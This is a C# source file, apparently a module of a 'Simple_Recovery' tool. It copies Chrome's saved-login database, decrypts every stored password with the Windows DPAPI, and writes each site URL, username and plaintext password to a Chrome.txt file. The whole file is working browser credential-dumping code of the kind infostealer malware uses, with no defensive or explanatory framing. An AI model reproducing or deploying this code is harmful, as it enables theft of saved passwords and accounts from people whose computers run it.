using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Dapper;

namespace Simple_Recovery.Modules
{
    internal class User
    {
        public string Action_url;

        public string Username_value;

        public byte[] Password_value;
    }

    public static class Chrome
    {
        // Get the entries within the database

        private static StringBuilder GetDatabaseEntries()
        {
            // Default folder path for the database
            
            var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
            
            var databaseEntries = new StringBuilder();

            // Create a copy of the database - Chrome has the original database open and is therefore locked

            if (File.Exists(folderPath + @"\Login Data Copy"))
            {
                File.Delete(folderPath + @"\Login Data Copy");

                File.Copy(folderPath + @"\Login Data", folderPath + @"\Login Data Copy");
            }

            else
            {
                File.Copy(folderPath + @"\Login Data", folderPath + @"\Login Data Copy");
            }

            using (var connection = new SQLiteConnection("Data Source=" + folderPath + @"\Login Data Copy"))
            {
                // Query used to get the database entries

                const string statement = "SELECT action_url, username_value, password_value FROM logins";

                // Open the database

                connection.Open();

                // Build a list of objects from the database query

                var entries = connection.Query<User>(statement);

                foreach (var entry in entries)
                {
                    // Decrypt the password

                    var decryptedPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(entry.Password_value, null, DataProtectionScope.CurrentUser));

                    databaseEntries.AppendLine($"{entry.Action_url} : {entry.Username_value} : {decryptedPassword}");
                }
            }

            // Delete the database copy

            File.Delete(folderPath + @"\Login Data Copy");

            return databaseEntries;
        }

        // Write the entries to a file

        public static void WriteToFile(string path)
        {
            var databaseEntries = GetDatabaseEntries();

            File.WriteAllText(path + @"\Chrome.txt", databaseEntries.ToString());
        }
    }
}